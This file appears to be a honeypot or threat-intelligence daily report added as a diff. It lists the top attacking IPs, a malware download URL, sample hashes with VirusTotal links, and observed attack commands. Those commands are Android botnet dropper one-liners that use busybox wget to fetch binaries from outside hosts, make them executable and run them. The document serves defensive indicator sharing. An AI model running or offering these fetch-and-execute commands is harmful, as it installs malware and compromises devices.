@@ -1,0 +1,28 @@
+Top 5 IPs for 2024-04-28 :
+
+61.3.81.127
+131.108.118.60
+91.207.115.249
+8.222.171.149
+118.32.159.5
+
+Malware Download:
+
+http://194.50.16.10/1.sh
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+92baabd1045e6a8ae73952451668ed9c8d4f87dbbaf1bfdb76cf90a9b7a915de
+https://www.virustotal.com/gui/file/92baabd1045e6a8ae73952451668ed9c8d4f87dbbaf1bfdb76cf90a9b7a915de
+9ef3f0d450f18610a0d47ec312965cc1661192e925ca3e92c30bb6271f042d71
+https://www.virustotal.com/gui/file/9ef3f0d450f18610a0d47ec312965cc1661192e925ca3e92c30bb6271f042d71
+e1dbc46eea55f940b6f63822b88b45e4be4fd122deb867a55e13f7b3820678ec
+https://www.virustotal.com/gui/file/e1dbc46eea55f940b6f63822b88b45e4be4fd122deb867a55e13f7b3820678ec
+fb088cec2214538871e219a8f90f737cbdb9b759d2473d92efe9de084fbc9e30
+https://www.virustotal.com/gui/file/fb088cec2214538871e219a8f90f737cbdb9b759d2473d92efe9de084fbc9e30
+
+
+Commands/exploits observed:
+
+cd /data/local/tmp/; rm arm*; busybox wget http://85.239.33.65/arm7; chmod +x arm7; ./arm7 android; busybox wget http://85.239.33.65/arm5; chmod +x arm5; ./arm5 android; busybox wget http://85.239.33.65/arm4; chmod +x arm4; ./arm4 android; busybox wget http://85.239.33.65/arm6; chmod +x arm6; ./arm6 android; busybox wget http://85.239.33.65/mips; chmod +x mips; ./mips android; busybox wget http://85.239.33.65/mpsl; chmod +x mpsl; ./mpsl android;
+
+cd /data/local/tmp/; rm arm*; busybox wget http://91.92.254.116/arm7; chmod +x arm7; ./arm7 android; busybox wget http://91.92.254.116/arm5; chmod +x arm5; ./arm5 android; busybox wget http://91.92.254.116/arm4; chmod +x arm4; ./arm4 android; busybox wget http://91.92.254.116/arm6; chmod +x arm6; ./arm6 android;
